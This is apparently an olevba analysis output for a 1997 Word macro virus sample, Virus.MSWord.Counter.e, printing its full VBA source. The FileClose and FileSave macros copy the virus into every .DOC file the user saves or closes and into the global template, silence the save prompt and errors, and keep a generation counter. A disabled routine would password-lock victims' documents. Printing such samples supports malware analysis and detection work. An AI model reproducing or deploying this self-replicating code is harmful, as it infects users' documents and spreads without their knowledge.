olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Counter.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"

Rem You didn't say the magic word.

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"

Rem Not in thledentitl
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim DestFile$
Dim MacroFile$
Dim Test
Dim Text_$
Dim Number
Dim Space_$

' ----------------------------
' | Written by Guy Incognito |
' |     Bedford, England     |
' |       on 26/09/97        |
' ----------------------------

On Error Resume Next

DestFile$ = WordBasic.[SelectionFileName$]()
MacroFile$ = WordBasic.[MacroFileName$]()

WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

If MacroFile$ = DestFile$ Then GoTo InfectGlobal

InfectDoc:
If WordBasic.[FileNameInfo$](DestFile$, 3) = "" Then GoTo NoInfect

Test = InStr(DestFile$, ".DOC")
If Test = 0 Then GoTo NoInfect

Text_$ = WordBasic.[MacroDesc$]("Generation")
If Len(Text_$) > 14 Then Text_$ = "0"
Number = WordBasic.Val(Text_$) + 1
Space_$ = Str(Number)
Text_$ = WordBasic.[LTrim$](Space_$)
WordBasic.ToolsMacro Name:="Generation", Description:=Text_$, SetDesc:=1

WordBasic.MacroCopy "FileClose", DestFile$ + ":FileClose"
WordBasic.MacroCopy "FileSave", DestFile$ + ":FileSave"
WordBasic.MacroCopy "ToolsMacro", DestFile$ + ":ToolsMacro"
WordBasic.MacroCopy "FileTemplates", DestFile$ + ":FileTemplates"
WordBasic.MacroCopy "FileExit0", DestFile$ + ":FileExit"
WordBasic.MacroCopy "Generation", DestFile$ + ":Generation"

Rem But all I wanna do is reproduce, man!

Rem If Second(Now()) <> 30 Then Goto NoEncrypt
Rem Key$ = GetSystemInfo$(26)
Rem FileSaveAs .Name = DestFile$, .Format = 1, .Password = Key$
Rem FileClose 2
Rem Goto Exit

NoEncrypt:
WordBasic.FileSaveAs Name:=DestFile$, Format:=1
WordBasic.FileClose 2
GoTo Exit_

InfectGlobal:

Text_$ = WordBasic.[MacroDesc$]("Generation")
If Len(Text_$) > 14 Then Text_$ = "0"
Number = WordBasic.Val(Text_$) + 1
Space_$ = Str(Number)
Text_$ = WordBasic.[LTrim$](Space_$)
WordBasic.ToolsMacro Name:="Generation", Description:=Text_$, SetDesc:=1

WordBasic.MacroCopy DestFile$ + ":FileClose", "FileClose"
WordBasic.MacroCopy DestFile$ + ":FileSave", "FileSave"
WordBasic.MacroCopy DestFile$ + ":ToolsMacro", "ToolsMacro"
WordBasic.MacroCopy DestFile$ + ":FileTemplates", "FileTemplates"
WordBasic.MacroCopy DestFile$ + ":FileExit", "FileExit0"
WordBasic.MacroCopy DestFile$ + ":Generation", "Generation"

NoInfect:
WordBasic.FileClose

Exit_:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DestFile$
Dim MacroFile$
Dim Test
Dim Text_$
Dim Number
Dim Space_$

' ----------------------------
' | Written by Guy Incognito |
' |     Bedford, England     |
' |       on 26/09/97        |
' ----------------------------

On Error Resume Next

DestFile$ = WordBasic.[SelectionFileName$]()
MacroFile$ = WordBasic.[MacroFileName$]()

WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

If MacroFile$ = DestFile$ Then GoTo InfectGlobal

InfectDoc:
If WordBasic.[FileNameInfo$](DestFile$, 3) = "" Then GoTo NoInfect

Test = InStr(DestFile$, ".DOC")
If Test = 0 Then GoTo NoInfect

Text_$ = WordBasic.[MacroDesc$]("Generation")
If Len(Text_$) > 14 Then Text_$ = "0"
Number = WordBasic.Val(Text_$) + 1
Space_$ = Str(Number)
Text_$ = WordBasic.[LTrim$](Space_$)
WordBasic.ToolsMacro Name:="Generation", Description:=Text_$, SetDesc:=1

WordBasic.MacroCopy "FileClose", DestFile$ + ":FileClose"
WordBasic.MacroCopy "FileSave", DestFile$ + ":FileSave"
WordBasic.MacroCopy "ToolsMacro", DestFile$ + ":ToolsMacro"
WordBasic.MacroCopy "FileTemplates", DestFile$ + ":FileTemplates"
WordBasic.MacroCopy "FileExit0", DestFile$ + ":FileExit"
WordBasic.MacroCopy "Generation", DestFile$ + ":Generation"

Rem But all I wanna do is reproduce, man!

Rem If Second(Now()) <> 30 Then Goto NoEncrypt
Rem Key$ = GetSystemInfo$(26)
Rem FileSaveAs .Name = DestFile$, .Format = 1, .Password = Key$
Rem Goto Exit

NoEncrypt:
WordBasic.FileSaveAs Name:=DestFile$, Format:=1
GoTo Exit_

InfectGlobal:

Text_$ = WordBasic.[MacroDesc$]("Generation")
If Len(Text_$) > 14 Then Text_$ = "0"
Number = WordBasic.Val(Text_$) + 1
Space_$ = Str(Number)
Text_$ = WordBasic.[LTrim$](Space_$)
WordBasic.ToolsMacro Name:="Generation", Description:=Text_$, SetDesc:=1

WordBasic.MacroCopy DestFile$ + ":FileClose", "FileClose"
WordBasic.MacroCopy DestFile$ + ":FileSave", "FileSave"
WordBasic.MacroCopy DestFile$ + ":ToolsMacro", "ToolsMacro"
WordBasic.MacroCopy DestFile$ + ":FileTemplates", "FileTemplates"
WordBasic.MacroCopy DestFile$ + ":FileExit", "FileExit0"
WordBasic.MacroCopy DestFile$ + ":Generation", "Generation"

NoInfect:
WordBasic.FileSave

Exit_:

End Sub
-------------------------------------------------------------------------------
VBA MACRO Generation.bas 
in file: ./Virus.MSWord.Counter.e - OLE stream: 'Macros/VBA/Generation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "311"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.Generation.MAIN"

Rem A generation counter

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

